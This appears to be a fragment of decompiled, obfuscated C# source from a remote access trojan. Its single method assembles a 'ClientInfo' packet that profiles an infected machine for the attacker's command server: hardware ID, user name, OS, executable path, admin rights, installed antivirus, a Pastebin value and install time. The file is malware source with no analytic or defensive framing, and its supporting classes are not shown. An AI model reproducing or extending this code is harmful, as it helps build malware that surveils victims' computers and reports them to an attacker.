using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using QoJxByZkfRQq;
using yKFnPcLKLkIvyuyev;

namespace TRjqmOcqLzx;

public static class vjHxixAgDbUszIf
{
	public static byte[] xdSPppktIGKa()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		EwTlhZtGQJxOhT ewTlhZtGQJxOhT = new EwTlhZtGQJxOhT();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Packet").NTyFKfiOUtVE = "ClientInfo";
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("HWID").NTyFKfiOUtVE = hFmOFeqzArJ.yihvSlyKIDo;
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("User").NTyFKfiOUtVE = Environment.UserName.ToString();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("OS").NTyFKfiOUtVE = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Path").NTyFKfiOUtVE = Application.get_ExecutablePath();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Version").NTyFKfiOUtVE = hFmOFeqzArJ.tMgBJnCOXkTn;
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Admin").NTyFKfiOUtVE = mAvhFVqBQBhm.qnUVzDiiryOuE().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Performance").NTyFKfiOUtVE = mAvhFVqBQBhm.mycqdPxfNM();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Pastebin").NTyFKfiOUtVE = hFmOFeqzArJ.ooqQjHHbqA;
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Antivirus").NTyFKfiOUtVE = mAvhFVqBQBhm.zNXvXiYEjtn();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Installed").NTyFKfiOUtVE = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Pong").NTyFKfiOUtVE = "";
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Group").NTyFKfiOUtVE = hFmOFeqzArJ.PbsfwdpCPsbbgzatY;
		return ewTlhZtGQJxOhT.zdVHdMvzwJZJVpl();
	}
}
